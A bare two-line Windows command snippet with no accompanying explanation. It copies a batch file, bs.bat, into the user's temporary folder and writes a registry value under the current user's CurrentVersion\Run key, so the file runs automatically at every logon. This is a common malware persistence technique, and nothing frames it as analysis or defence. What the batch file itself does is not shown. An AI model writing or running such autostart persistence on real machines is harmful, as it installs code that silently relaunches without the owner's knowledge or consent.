cp bs.bat %TEMP%
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "BS" /t REG_SZ /F /D "%TEMP%\bs.bat"